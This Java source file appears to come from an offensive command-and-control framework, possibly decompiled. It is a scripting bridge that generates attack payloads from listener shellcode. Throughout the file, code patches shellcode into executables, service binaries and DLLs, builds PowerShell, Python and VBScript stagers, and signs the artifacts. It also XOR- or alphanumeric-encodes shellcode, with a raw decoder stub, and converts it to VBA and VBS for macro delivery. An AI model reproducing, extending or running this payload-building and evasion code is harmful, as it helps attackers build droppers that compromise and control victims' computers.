package aggressor.bridges;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import aggressor.GlobalDataManager;
import common.*;
import cortana.Cortana;
import encoders.Transforms;
import sleep.bridges.BridgeUtilities;
import sleep.bridges.SleepClosure;
import sleep.interfaces.Function;
import sleep.interfaces.Loadable;
import sleep.runtime.Scalar;
import sleep.runtime.ScriptInstance;
import sleep.runtime.SleepUtils;

import java.util.Stack;

public class ArtifactBridge implements Function,
        Loadable {
    protected AggressorClient client;

    public ArtifactBridge(AggressorClient client) {
        this.client = client;
    }

    @Override
    public void scriptLoaded(ScriptInstance si) {
        Cortana.put(si, "&shellcode", this);
        Cortana.put(si, "&artifact", this);
        Cortana.put(si, "&artifact_raw", this);
        Cortana.put(si, "&artifact_stageless", this);
        Cortana.put(si, "&powershell", this);
        Cortana.put(si, "&artifact_sign", this);
        Cortana.put(si, "&transform", this);
        Cortana.put(si, "&transform_vbs", this);
        Cortana.put(si, "&encode", this);
        Cortana.put(si, "&str_chunk", this);
    }

    @Override
    public void scriptUnloaded(ScriptInstance si) {
    }

    @Override
    public Scalar evaluate(String fname, ScriptInstance script, Stack args) {
        if ("&artifact_sign".equals(fname)) {
            byte[] data = CommonUtils.toBytes(BridgeUtilities.getString(args, ""));
            return SleepUtils.getScalar(DataUtils.getSigner(this.client.getData()).sign(data));
        }
        if ("&artifact_raw".equals(fname)) {
            byte[] stager = CommonUtils.toBytes(BridgeUtilities.getString(args, ""));
            String arch = BridgeUtilities.getString(args, "x86");
            if ("x64".equals(arch)) {
                byte[] data = new byte[]{};
                data = new ArtifactUtils(this.client).patchArtifact(stager, "artifact64.exe");
                return SleepUtils.getScalar(data);
            }
            if ("x86".equals(arch)) {
                byte[] data = new byte[]{};
                data = new ArtifactUtils(this.client).patchArtifact(stager, "artifact32.exe");
                return SleepUtils.getScalar(data);
            }
        } else if ("&artifact_stageless".equals(fname)) {
            String name = BridgeUtilities.getString(args, "");
            final String type = BridgeUtilities.getString(args, "");
            final String arch = BridgeUtilities.getString(args, "x86");
            String proxyc = BridgeUtilities.getString(args, "");
            final SleepClosure cb = BridgeUtilities.getFunction(args, script);
            this.client.getConnection().call("listeners.export", CommonUtils.args(name, arch, proxyc), (call, result) -> {
                byte[] stage = (byte[]) result;
                byte[] data = new byte[]{};
                if ("x64".equals(arch)) {
                    switch (type) {
                        case "exe":
                            data = new ArtifactUtils(ArtifactBridge.this.client).patchArtifact(stage, "artifact64big.exe");
                            break;
                        case "svcexe":
                            data = new ArtifactUtils(ArtifactBridge.this.client).patchArtifact(stage, "artifact64svcbig.exe");
                            break;
                        case "dllx64":
                            data = new ArtifactUtils(ArtifactBridge.this.client).patchArtifact(stage, "artifact64big.x64.dll");
                            break;
                        case "powershell":
                            data = new ResourceUtils(ArtifactBridge.this.client).buildPowerShell(stage, true);
                            break;
                        case "raw":
                            data = stage;
                            break;
                    }
                } else if (type.equals("exe")) {
                    data = new ArtifactUtils(ArtifactBridge.this.client).patchArtifact(stage, "artifact32big.exe");
                } else if (type.equals("svcexe")) {
                    data = new ArtifactUtils(ArtifactBridge.this.client).patchArtifact(stage, "artifact32svcbig.exe");
                } else if (type.equals("dll")) {
                    data = new ArtifactUtils(ArtifactBridge.this.client).patchArtifact(stage, "artifact32big.dll");
                } else if (type.equals("dllx64")) {
                    data = new ArtifactUtils(ArtifactBridge.this.client).patchArtifact(stage, "artifact64big.dll");
                } else if (type.equals("powershell")) {
                    data = new ResourceUtils(ArtifactBridge.this.client).buildPowerShell(stage);
                } else if (type.equals("raw")) {
                    data = stage;
                }
                if (data.length == 0) {
                    CommonUtils.print_error("No artifact for type '" + type + "' (" + arch + ")");
                    return;
                }
                Stack<Scalar> args1 = new Stack<>();
                args1.push(SleepUtils.getScalar(data));
                SleepUtils.runCode(cb, "&artifact_stageless", null, args1);
            });
        } else {
            if ("&artifact".equals(fname)) {
                String name = BridgeUtilities.getString(args, "");
                String type = BridgeUtilities.getString(args, "");
                Scalar next = BridgeUtilities.getScalar(args);
                String arch = BridgeUtilities.getString(args, "x86");
                if ("python".equals(type)) {
                    byte[] stager32 = DataUtils.shellcode(GlobalDataManager.getGlobalDataManager(), name, SleepUtils.isTrueScalar(next));
                    byte[] stager64 = DataUtils.shellcodeX64(GlobalDataManager.getGlobalDataManager(), name);
                    return SleepUtils.getScalar(new ResourceUtils(this.client).buildPython(stager32, stager64));
                }
                if ("x64".equals(arch)) {
                    byte[] stager = DataUtils.shellcodeX64(GlobalDataManager.getGlobalDataManager(), name);
                    byte[] data = new byte[]{};
                    if (stager.length == 0) {
                        throw new RuntimeException("Could not generate x64 shellcode for listener \"" + name + "\"");
                    }
                    if ("exe".equals(type)) {
                        data = new ArtifactUtils(this.client).patchArtifact(stager, "artifact64.exe");
                    } else if ("svcexe".equals(type)) {
                        data = new ArtifactUtils(this.client).patchArtifact(stager, "artifact64svc.exe");
                    } else {
                        if ("dll".equals(type)) {
                            throw new RuntimeException("Can not generate an x86 dll for an x64 stager. Try dllx64");
                        }
                        if ("dllx64".equals(type)) {
                            data = new ArtifactUtils(this.client).patchArtifact(stager, "artifact64.x64.dll");
                        } else if ("powershell".equals(type)) {
                            data = new ResourceUtils(this.client).buildPowerShell(stager, true);
                        } else if ("vbscript".equals(type)) {
                            throw new RuntimeException("The VBS output is only compatible with x86 stagers (for now)");
                        }
                    }
                    return SleepUtils.getScalar(data);
                }
                byte[] stager = DataUtils.shellcode(GlobalDataManager.getGlobalDataManager(), name, SleepUtils.isTrueScalar(next));
                byte[] data = new byte[]{};
                if (stager.length == 0) {
                    throw new RuntimeException("Could not generate x86 shellcode for listener \"" + name + "\"");
                }
                if ("exe".equals(type)) {
                    data = new ArtifactUtils(this.client).patchArtifact(stager, "artifact32.exe");
                } else if ("svcexe".equals(type)) {
                    data = new ArtifactUtils(this.client).patchArtifact(stager, "artifact32svc.exe");
                } else if ("dll".equals(type)) {
                    data = new ArtifactUtils(this.client).patchArtifact(stager, "artifact32.dll");
                } else if ("dllx64".equals(type)) {
                    data = new ArtifactUtils(this.client).patchArtifact(stager, "artifact64.dll");
                } else if ("powershell".equals(type)) {
                    data = new ResourceUtils(this.client).buildPowerShell(stager, false);
                } else if ("vbscript".equals(type)) {
                    data = new MutantResourceUtils(this.client).buildVBS(stager);
                }
                return SleepUtils.getScalar(data);
            }
            if ("&shellcode".equals(fname)) {
                String name = BridgeUtilities.getString(args, "");
                Scalar next = BridgeUtilities.getScalar(args);
                String arch = BridgeUtilities.getString(args, "x86");
                if ("x64".equals(arch)) {
                    byte[] code = DataUtils.shellcodeX64(GlobalDataManager.getGlobalDataManager(), name);
                    return SleepUtils.getScalar(code);
                }
                byte[] code = DataUtils.shellcode(GlobalDataManager.getGlobalDataManager(), name, SleepUtils.isTrueScalar(next));
                return SleepUtils.getScalar(code);
            }
            if ("&powershell".equals(fname)) {
                String name = BridgeUtilities.getString(args, "");
                Scalar next = BridgeUtilities.getScalar(args);
                String arch = BridgeUtilities.getString(args, "x86");
                if ("x64".equals(arch)) {
                    byte[] code = DataUtils.shellcodeX64(GlobalDataManager.getGlobalDataManager(), name);
                    byte[] cmd = new PowerShellUtils(this.client).buildPowerShellCommand(code, true);
                    return SleepUtils.getScalar(CommonUtils.bString(cmd));
                }
                byte[] code = DataUtils.shellcode(GlobalDataManager.getGlobalDataManager(), name, SleepUtils.isTrueScalar(next));
                byte[] cmd = new PowerShellUtils(this.client).buildPowerShellCommand(code);
                return SleepUtils.getScalar(CommonUtils.bString(cmd));
            }
            if ("&encode".equals(fname)) {
                byte[] shellcode = CommonUtils.toBytes(BridgeUtilities.getString(args, ""));
                String encoder = BridgeUtilities.getString(args, "");
                String arch = BridgeUtilities.getString(args, "x86");
                if (License.isTrial()) {
                    return SleepUtils.getScalar(shellcode);
                }
                if ("xor".equals(encoder)) {
                    return SleepUtils.getScalar(ArtifactUtils._XorEncode(shellcode, arch));
                }
                if ("alpha".equals(encoder) && "x86".equals(arch)) {
                    byte[] putmeinedi = new byte[]{-21, 3, 95, -1, -25, -24, -8, -1, -1, -1};
                    return SleepUtils.getScalar(CommonUtils.join(putmeinedi, CommonUtils.toBytes(ArtifactUtils._AlphaEncode(shellcode))));
                }
                throw new IllegalArgumentException("No encoder '" + encoder + "' for " + arch);
            }
            if ("&str_chunk".equals(fname)) {
                String text = BridgeUtilities.getString(args, "");
                int max = BridgeUtilities.getInt(args, 100);
                return SleepUtils.getArrayWrapper(ArtifactUtils.toChunk(text, max));
            }
            if ("&transform".equals(fname)) {
                byte[] shellcode = CommonUtils.toBytes(BridgeUtilities.getString(args, ""));
                String type = BridgeUtilities.getString(args, "");
                if ("array".equals(type)) {
                    return SleepUtils.getScalar(Transforms.toArray(shellcode));
                }
                if ("escape-hex".equals(type)) {
                    return SleepUtils.getScalar(Transforms.toVeil(shellcode));
                }
                if ("hex".equals(type)) {
                    return SleepUtils.getScalar(ArtifactUtils.toHex(shellcode));
                }
                if ("powershell-base64".equals(type)) {
                    return SleepUtils.getScalar(CommonUtils.Base64PowerShell(CommonUtils.bString(shellcode)));
                }
                if ("vba".equals(type)) {
                    return SleepUtils.getScalar(Transforms.toVBA(shellcode));
                }
                if ("vbs".equals(type)) {
                    return SleepUtils.getScalar(ArtifactUtils.toVBS(shellcode));
                }
                if ("veil".equals(type)) {
                    return SleepUtils.getScalar(Transforms.toVeil(shellcode));
                }
                throw new IllegalArgumentException("Type '" + type + "' is unknown");
            }
            if ("&transform_vbs".equals(fname)) {
                byte[] shellcode = CommonUtils.toBytes(BridgeUtilities.getString(args, ""));
                int maxch = BridgeUtilities.getInt(args, 8);
                return SleepUtils.getScalar(ArtifactUtils.toVBS(shellcode, maxch));
            }
        }
        return SleepUtils.getEmptyScalar();
    }

}

